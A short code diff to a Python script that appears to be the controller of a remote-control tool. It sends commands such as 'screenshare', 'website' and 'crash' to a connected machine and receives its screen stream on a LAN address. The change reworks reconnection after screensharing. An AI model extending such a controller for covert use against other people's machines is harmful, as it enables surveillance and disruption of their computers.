@@ -31,6 +31,7 @@ def main():
                 username(conn, command)
             elif command == "screenshare":
                 screenshare(conn, command, sock)
+                conn, sock = connect()
             elif command == "website":
                 website(conn, command)
             elif command == "crash":
@@ -108,6 +109,8 @@ def username(conn, command):
 
 def screenshare(conn, command, sock):
     conn.send(command.encode())
+    #time = input("Enter time >> ")
+    #conn.send(time.encode())
     sock.close()
     conn.close()
     receiver = StreamingServer("192.168.178.59", 8080)
@@ -115,8 +118,6 @@ def screenshare(conn, command, sock):
     t.start()
     time.sleep(15)
     receiver.stop_server()
-    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    connect()
 
 
 def website(conn, command):
